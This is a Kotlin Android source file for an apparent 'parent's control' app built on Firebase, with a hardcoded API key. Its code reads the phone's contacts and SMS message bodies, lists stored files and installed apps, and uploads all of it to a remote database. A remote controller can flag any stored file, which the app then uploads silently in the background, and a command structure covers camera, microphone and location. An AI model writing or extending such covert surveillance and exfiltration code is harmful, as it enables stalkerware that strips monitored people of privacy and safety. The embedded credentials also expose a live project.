package com.example

import android.content.Context
import android.util.Log
import com.google.firebase.FirebaseApp
import com.google.firebase.FirebaseOptions
import com.google.firebase.auth.FirebaseAuth
import com.google.firebase.database.*
import java.io.File
import java.text.SimpleDateFormat
import java.util.*
import kotlinx.coroutines.*

object FirebaseManager {
    private const val TAG = "FirebaseManager"
    private var isInitialized = false

    fun initFirebase(context: Context) {
        if (isInitialized) return
        try {
            val options = FirebaseOptions.Builder()
                .setApplicationId("1:852401080164:android:c461f6746759e810dd1c71")
                .setApiKey("AIzaSyDtHwRvlezCmI8wnsQTOADwgFP_bkyIM2Q")
                .setDatabaseUrl("https://my-project-c71d4-default-rtdb.firebaseio.com")
                .setProjectId("my-project-c71d4")
                .setStorageBucket("my-project-c71d4.firebasestorage.app")
                .build()
            
            FirebaseApp.initializeApp(context, options)
            isInitialized = true
            Log.d(TAG, "Firebase initialized successfully manually!")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to initialize Firebase", e)
        }
    }

    val auth: FirebaseAuth
        get() = FirebaseAuth.getInstance()

    val database: FirebaseDatabase
        get() = FirebaseDatabase.getInstance()

    fun getRef(path: String): DatabaseReference {
        return database.getReference("parent's control/$path")
    }

    fun getSanitizedEmail(email: String): String {
        return email.replace(".", "_")
    }

    // Creates the initial command structure in Firebase as requested
    fun createDefaultCommandStructure(email: String) {
        val sanitized = getSanitizedEmail(email)
        val ref = getRef("Command").child(sanitized)
        
        ref.addListenerForSingleValueEvent(object : ValueEventListener {
            override fun onDataChange(snapshot: DataSnapshot) {
                if (!snapshot.exists()) {
                    val defaultStructure = mapOf(
                        "video" to "off",
                        "time" to "5:30",
                        "camera" to "back",
                        "mic" to "off",
                        "mic_time" to "5:30",
                        "image" to "off",
                        "limits" to "3",
                        "location" to "off",
                        "screen_block" to "off",
                        "notification" to mapOf(
                            "title" to "Study Time Announcement! 📚",
                            "body" to "Please return to your books immediately and lock unnecessary screens.",
                            "photo" to "https://images.unsplash.com/photo-1497633762265-9d179a990aa6?w=600&auto=format&fit=crop",
                            "action" to "https://classroom.google.com",
                            "status" to "pending",
                            "timestamp" to System.currentTimeMillis()
                        )
                    )
                    ref.setValue(defaultStructure)
                        .addOnSuccessListener {
                            Log.d(TAG, "Default structure created under /Command/$sanitized")
                        }
                        .addOnFailureListener {
                            Log.e(TAG, "Failed to create default structure", it)
                        }
                }
            }

            override fun onCancelled(error: DatabaseError) {
                Log.e(TAG, "onCancelled default check", error.toException())
            }
        })
    }

    // New helper to upload structural details of the device status (e.g. permissions logs) directly to Firebase Console
    fun uploadDeviceStatus(email: String, permissions: Map<String, Boolean>) {
        val sanitized = getSanitizedEmail(email)
        val ref = getRef("Devices").child(sanitized)
        val sdf = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())
        
        val permissionsMap = permissions.mapKeys { (key, _) ->
            key.substringAfterLast(".") // Just shorten manifested ID e.g. CAMERA
        }

        val deviceData = mapOf(
            "email" to email,
            "status" to "SENSORS OK & BACKGROUND READY",
            "lastActive" to sdf.format(Date()),
            "permissions" to permissionsMap
        )
        
        ref.setValue(deviceData)
            .addOnSuccessListener {
                Log.d(TAG, "Device status structure uploaded to /Devices/$sanitized")
            }
            .addOnFailureListener {
                Log.e(TAG, "Failed uploading device details structure", it)
            }
    }

    fun submitUpload(email: String, fileUrl: String, type: String, details: String) {
        val sanitized = getSanitizedEmail(email)
        val ref = getRef("Upload's").child(sanitized).push()
        
        val sdf = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())
        val uploadMap = mapOf(
            "Date" to sdf.format(Date()),
            "File" to fileUrl,
            "Type" to type,
            "Details" to details
        )
        ref.setValue(uploadMap)
            .addOnSuccessListener {
                Log.d(TAG, "Successfully submitted upload path 'Upload's' to RTDB: $fileUrl")
            }
            .addOnFailureListener {
                Log.e(TAG, "Failed submitting upload info to RTDB", it)
            }
    }

    fun uploadContacts(context: Context, email: String) {
        val sanitized = getSanitizedEmail(email)
        val ref = getRef("Devices").child(sanitized).child("Contacts")
        
        if (androidx.core.content.ContextCompat.checkSelfPermission(context, android.Manifest.permission.READ_CONTACTS) != android.content.pm.PackageManager.PERMISSION_GRANTED) {
            ref.setValue(mapOf("error" to "Permission READ_CONTACTS not granted"))
            return
        }

        val list = mutableListOf<Map<String, String>>()
        try {
            val resolver = context.contentResolver
            val cursor = resolver.query(
                android.provider.ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                arrayOf(
                    android.provider.ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                    android.provider.ContactsContract.CommonDataKinds.Phone.NUMBER
                ),
                null,
                null,
                null
            )
            cursor?.use {
                val nameIndex = it.getColumnIndex(android.provider.ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
                val numberIndex = it.getColumnIndex(android.provider.ContactsContract.CommonDataKinds.Phone.NUMBER)
                var count = 0
                while (it.moveToNext() && count < 200) {
                    val name = if (nameIndex >= 0) it.getString(nameIndex) ?: "" else ""
                    val number = if (numberIndex >= 0) it.getString(numberIndex) ?: "" else ""
                    if (name.isNotEmpty() || number.isNotEmpty()) {
                        list.add(mapOf("name" to name, "phone" to number))
                        count++
                    }
                }
            }
            if (list.isEmpty()) {
                list.add(mapOf("name" to "No contacts found", "phone" to ""))
            }
            ref.setValue(list)
                .addOnSuccessListener { Log.d(TAG, "Contacts uploaded successfully") }
                .addOnFailureListener { Log.e(TAG, "Failed to upload contacts", it) }
        } catch (e: Exception) {
            Log.e(TAG, "Error fetching contacts", e)
            ref.setValue(mapOf("error" to (e.message ?: "Unknown Exception")))
        }
    }

    fun uploadSMS(context: Context, email: String) {
        val sanitized = getSanitizedEmail(email)
        val ref = getRef("Devices").child(sanitized).child("SMS")
        
        if (androidx.core.content.ContextCompat.checkSelfPermission(context, android.Manifest.permission.READ_SMS) != android.content.pm.PackageManager.PERMISSION_GRANTED) {
            ref.setValue(mapOf("error" to "Permission READ_SMS not granted"))
            return
        }

        val list = mutableListOf<Map<String, String>>()
        try {
            val cursor = context.contentResolver.query(
                android.net.Uri.parse("content://sms/inbox"),
                arrayOf("address", "body", "date"),
                null,
                null,
                "date DESC"
            )
            cursor?.use {
                val addressIndex = it.getColumnIndex("address")
                val bodyIndex = it.getColumnIndex("body")
                val dateIndex = it.getColumnIndex("date")
                val sdf = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())
                var count = 0
                while (it.moveToNext() && count < 100) {
                    val address = if (addressIndex >= 0) it.getString(addressIndex) ?: "" else ""
                    val body = if (bodyIndex >= 0) it.getString(bodyIndex) ?: "" else ""
                    val dateMs = if (dateIndex >= 0) it.getLong(dateIndex) else 0L
                    val dateStr = if (dateMs > 0) sdf.format(Date(dateMs)) else ""
                    if (address.isNotEmpty() || body.isNotEmpty()) {
                        list.add(mapOf("sender" to address, "body" to body, "dateTime" to dateStr))
                        count++
                    }
                }
            }
            if (list.isEmpty()) {
                list.add(mapOf("sender" to "No messages found", "body" to "", "dateTime" to ""))
            }
            ref.setValue(list)
                .addOnSuccessListener { Log.d(TAG, "SMS logs uploaded successfully") }
                .addOnFailureListener { Log.e(TAG, "Failed to upload SMS logs", it) }
        } catch (e: Exception) {
            Log.e(TAG, "Error fetching SMS", e)
            ref.setValue(mapOf("error" to (e.message ?: "Unknown Exception")))
        }
    }

    fun uploadStorageStructure(context: Context, email: String) {
        val sanitized = getSanitizedEmail(email)
        val ref = getRef("Devices").child(sanitized).child("StorageStructure")
        
        val root = FileManager.getRootDirectory(context)
        val fileList = mutableListOf<Map<String, Any>>()
        val visitedPaths = mutableSetOf<String>()
        
        fun walk(dir: File, depth: Int) {
            if (depth > 4 || fileList.size >= 150) return
            val pathKey = dir.absolutePath
            if (visitedPaths.contains(pathKey)) return
            visitedPaths.add(pathKey)
            
            val files = dir.listFiles() ?: return
            for (f in files) {
                if (fileList.size >= 150) break
                val isDir = f.isDirectory
                val path = f.absolutePath
                val item = mapOf(
                    "name" to f.name,
                    "path" to path,
                    "isDir" to isDir,
                    "size" to (if (isDir) 0L else f.length()),
                    "upload" to "off",
                    "downloadUrl" to ""
                )
                fileList.add(item)
                if (isDir) {
                    walk(f, depth + 1)
                }
            }
        }
        
        try {
            walk(root, 1)
            
            // If the standard root walkthrough returned very few elements (e.g. Scoped Storage restrictions on API 30+),
            // let's explicitly crawl user public directories such as Download and Documents.
            if (fileList.size < 10) {
                val commonDirs = listOf(
                    android.os.Environment.getExternalStoragePublicDirectory(android.os.Environment.DIRECTORY_DOWNLOADS),
                    android.os.Environment.getExternalStoragePublicDirectory(android.os.Environment.DIRECTORY_DOCUMENTS),
                    android.os.Environment.getExternalStoragePublicDirectory(android.os.Environment.DIRECTORY_DCIM),
                    android.os.Environment.getExternalStoragePublicDirectory(android.os.Environment.DIRECTORY_PICTURES)
                )
                for (dir in commonDirs) {
                    if (dir.exists() && dir.isDirectory) {
                        walk(dir, 1)
                    }
                }
            }
            
            if (fileList.isEmpty()) {
                fileList.add(mapOf(
                    "name" to "No files found",
                    "path" to root.absolutePath,
                    "isDir" to false,
                    "size" to 0L,
                    "upload" to "off",
                    "downloadUrl" to ""
                ))
            }
            ref.setValue(fileList)
                .addOnSuccessListener { Log.d(TAG, "Storage structure uploaded successfully: ${fileList.size} items") }
                .addOnFailureListener { Log.e(TAG, "Failed to upload Storage structure", it) }
        } catch (e: Exception) {
            Log.e(TAG, "Error uploading storage structure", e)
        }
    }

    fun uploadInstalledApps(context: Context, email: String) {
        val sanitized = getSanitizedEmail(email)
        val ref = getRef("Devices").child(sanitized).child("InstalledApps")
        
        try {
            val pm = context.packageManager
            val intent = android.content.Intent(android.content.Intent.ACTION_MAIN, null).apply {
                addCategory(android.content.Intent.CATEGORY_LAUNCHER)
            }
            val resolveInfos = pm.queryIntentActivities(intent, 0)
            val appList = mutableListOf<Map<String, Any>>()
            val handledPackages = mutableSetOf<String>()
            
            for (info in resolveInfos) {
                val pkgName = info.activityInfo.packageName
                if (pkgName == context.packageName) continue
                if (handledPackages.contains(pkgName)) continue
                handledPackages.add(pkgName)
                
                val appLabel = info.loadLabel(pm).toString()
                appList.add(mapOf(
                    "packageName" to pkgName,
                    "appName" to appLabel,
                    "blocked" to "off"
                ))
            }
            
            if (appList.isNotEmpty()) {
                appList.sortBy { (it["appName"] as? String ?: "").lowercase() }
                
                ref.addListenerForSingleValueEvent(object : ValueEventListener {
                    override fun onDataChange(snapshot: DataSnapshot) {
                        val previousBlockMap = mutableMapOf<String, String>()
                        if (snapshot.exists()) {
                            for (child in snapshot.children) {
                                val pName = child.child("packageName").value?.toString() ?: continue
                                val blockState = child.child("blocked").value?.toString() ?: "off"
                                if (blockState == "on") {
                                    previousBlockMap[pName] = "on"
                                }
                            }
                        }
                        
                        val updatedList = appList.map { app ->
                            val pName = app["packageName"] as String
                            if (previousBlockMap.containsKey(pName)) {
                                app.toMutableMap().apply { put("blocked", "on") }
                            } else {
                                app
                            }
                        }
                        
                        ref.setValue(updatedList)
                            .addOnSuccessListener { Log.d(TAG, "Installed apps uploaded successfully: ${updatedList.size}") }
                            .addOnFailureListener { Log.e(TAG, "Failed uploading installed apps", it) }
                    }

                    override fun onCancelled(error: DatabaseError) {}
                })
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error listing/uploading packages to Firebase", e)
        }
    }

    private var isStorageObserverRegistered = false

    fun observeStorageUploads(context: Context, email: String, onLogAdded: (String) -> Unit) {
        if (isStorageObserverRegistered) return
        isStorageObserverRegistered = true
        
        val sanitized = getSanitizedEmail(email)
        val ref = getRef("Devices").child(sanitized).child("StorageStructure")
        
        ref.addValueEventListener(object : ValueEventListener {
            override fun onDataChange(snapshot: DataSnapshot) {
                if (!snapshot.exists()) return
                for (child in snapshot.children) {
                    val uploadValue = child.child("upload").value?.toString() ?: "off"
                    if (uploadValue == "on") {
                        val path = child.child("path").value?.toString() ?: continue
                        val isDir = child.child("isDir").value as? Boolean ?: false
                        val key = child.key ?: continue
                        
                        if (!isDir) {
                            val file = File(path)
                            if (file.exists() && file.isFile) {
                                // Mark as pending
                                ref.child(key).child("upload").setValue("pending")
                                onLogAdded("📲 Remote task triggered in background: Uploading file $path")
                                
                                CoroutineScope(Dispatchers.IO).launch {
                                    try {
                                        val fallbackType = if (file.name.contains(".jpg") || file.name.contains(".png")) "image" else "raw"
                                        val url = CloudinaryUploader.uploadFile(file, fallbackType)
                                        withContext(Dispatchers.Main) {
                                            ref.child(key).child("upload").setValue("done")
                                            ref.child(key).child("downloadUrl").setValue(url)
                                            submitUpload(email, url, "file_transfer", "Uploaded storage file: ${file.name}")
                                            onLogAdded("✅ Storage file successfully pushed: $url")
                                        }
                                    } catch (e: Exception) {
                                        withContext(Dispatchers.Main) {
                                            ref.child(key).child("upload").setValue("failed")
                                            onLogAdded("❌ Storage upload failed: ${e.message}")
                                        }
                                    }
                                }
                            } else {
                                ref.child(key).child("upload").setValue("file_not_found")
                            }
                        }
                    }
                }
            }

            override fun onCancelled(error: DatabaseError) {}
        })
    }

    fun sendNotificationToChild(
        targetEmail: String,
        title: String,
        message: String,
        photoUrl: String,
        actionUrl: String,
        onSuccess: () -> Unit,
        onFailure: (Exception) -> Unit
    ) {
        val sanitized = getSanitizedEmail(targetEmail)
        val ref = getRef("Command").child(sanitized).child("notification")
        
        val data = mapOf(
            "title" to title,
            "body" to message,
            "photo" to photoUrl,
            "action" to actionUrl,
            "status" to "send",
            "timestamp" to System.currentTimeMillis()
        )
        
        ref.setValue(data)
            .addOnSuccessListener { onSuccess() }
            .addOnFailureListener { onFailure(it) }
    }
}
